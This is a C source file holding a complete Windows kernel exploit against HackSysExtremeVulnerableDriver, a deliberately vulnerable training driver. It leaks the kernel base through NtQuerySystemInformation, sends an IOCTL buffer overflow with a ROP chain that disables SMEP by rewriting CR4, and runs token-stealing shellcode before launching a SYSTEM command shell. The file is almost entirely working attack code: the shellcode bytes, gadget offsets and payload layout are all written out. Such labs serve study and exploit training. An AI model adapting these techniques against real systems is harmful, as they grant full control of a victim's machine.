#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

typedef struct _SYSTEM_LOCK {
	PVOID	Address;
	USHORT  Type;
	USHORT  Reserved1;
	ULONG	ExclusiveOwnerThreadId;
	ULONG	ActiveCount;
	ULONG	ContentionCount;
	ULONG	Reserved2[2];
#ifdef _WIN64
	ULONG	Reserved3;
#endif
	ULONG	NumberOfSharedWaiters;
	ULONG	NumberOfExclusiveWaiters;
} SYSTEM_LOCK, *PSYSTEM_LOCK;

typedef struct SYSTEM_LOCK_INFORMATION {
	ULONG              LocksCount;
	SYSTEM_LOCK        Locks[1];
} SYSTEM_LOCK_INFORMATION, *PSYSTEM_LOCK_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemLockInformation = 12
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

PVOID leak()
{
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		return 1;
	}

	PSYSTEM_LOCK_INFORMATION pLockInfo = NULL;
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;

	do {
		len *= 2;
		pLockInfo = (PSYSTEM_LOCK_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemLockInformation, pLockInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);
	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
		return 1;
	}
	for (unsigned int i = 0; i < pLockInfo->LocksCount; i++) {
		PVOID lockAddress = pLockInfo->Locks[i].Address;
		USHORT lockType = (USHORT)pLockInfo->Locks[i].Type;
		return lockAddress;

	}
	return 0;
}

HANDLE OpenDevice(const char* deviceName)
{
    HANDLE hDevice = CreateFileA(
        deviceName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    return hDevice;
}

BOOL ioctl(HANDLE hDevice, DWORD controlCode, LPVOID InBuf, ULONG InSize, LPVOID OutBuf, ULONG OutSize) {
    DWORD bytesReturned;
    return DeviceIoControl(
        hDevice, controlCode,
        InBuf, InSize,
        OutBuf, OutSize,
        &bytesReturned, NULL
    );
}

/*
0:  90                      nop
1:  90                      nop
2:  90                      nop
3:  65 48 8b 14 25 88 01    mov    rdx,QWORD PTR gs:0x188
a:  00 00
c:  4c 8b 82 b8 00 00 00    mov    r8,QWORD PTR [rdx+0xb8]
13: 49 8b 88 48 04 00 00    mov    rcx,QWORD PTR [r8+0x448]
1a: 48 8b 51 f8             mov    rdx,QWORD PTR [rcx-0x8]
1e: 48 83 fa 04             cmp    rdx,0x4
22: 74 05                   je     0x29
24: 48 8b 09                mov    rcx,QWORD PTR [rcx]
27: eb f1                   jmp    0x1a
29: 48 8b 41 70             mov    rax,QWORD PTR [rcx+0x70]
2d: 24 f0                   and    al,0xf0
2f: 49 89 80 b8 04 00 00    mov    QWORD PTR [r8+0x4b8],rax
36: 4d 31 ed                xor    r13,r13
39: 48 83 c4 10             add    rsp,0x10             // Restore execution
3d: c3                      ret
*/
unsigned char shellcode[] =
{
    0x90, 0x90, 0x90,
    0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x82,
    0xb8, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x88, 0x48, 0x04, 0x00, 0x00, 0x48,
    0x8b, 0x51, 0xf8, 0x48, 0x83, 0xfa, 0x04, 0x74, 0x05, 0x48, 0x8b, 0x09,
    0xeb, 0xf1, 0x48, 0x8b, 0x41, 0x70, 0x24, 0xf0, 0x49, 0x89, 0x80, 0xb8,
    0x04, 0x00, 0x00, 0x4d, 0x31, 0xed,
    0x48, 0x83, 0xC4, 0x10, 0xC3
};

void Exploit()
{
    const char *deviceName = "\\\\.\\HackSysExtremeVulnerableDriver";
    unsigned long long payload[0x4000] = { 0, };
    unsigned int idx = 0;

    HANDLE hDevice = OpenDevice(deviceName);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("error: OpenDevice\n");
        return;
    }

    // Get ntoskrnl.exe base address
    unsigned long long ntoskrnl_base = leak() - 0xc196c0;
    printf("ntoskrnl base :%p\n", ntoskrnl_base);

    // Set execute permission to shellcode
    DWORD oldProtect;
    if (!VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("error: VirtualProtect\n");
        return;
    }

    // Prepare payload (bypass SMEP and execute shellcode)
    for (idx=0; idx < 0x818 / 8; idx++) {
        payload[idx] = 0;       // maybe r15, r14, r12 must be 0. If not, Multiple IRP Complete Requests error will occur.
    }

    unsigned long long cr4 = 0xb50ef8;
    cr4 &= ~(1ULL << 20);

    payload[idx++] = ntoskrnl_base + 0x2148c8;  // pop rcx; ret;
    payload[idx++] = cr4;
    payload[idx++] = ntoskrnl_base + 0x3a0a87;  // mov cr4, rcx; ret;
    payload[idx++] = shellcode;

    ioctl(hDevice, 0x222003, payload, 0x818 + 8 * 4, NULL, 0);

    return;
}

int main() {
    Exploit();
    WinExec("cmd.exe", SW_SHOW);
    return 0;
}
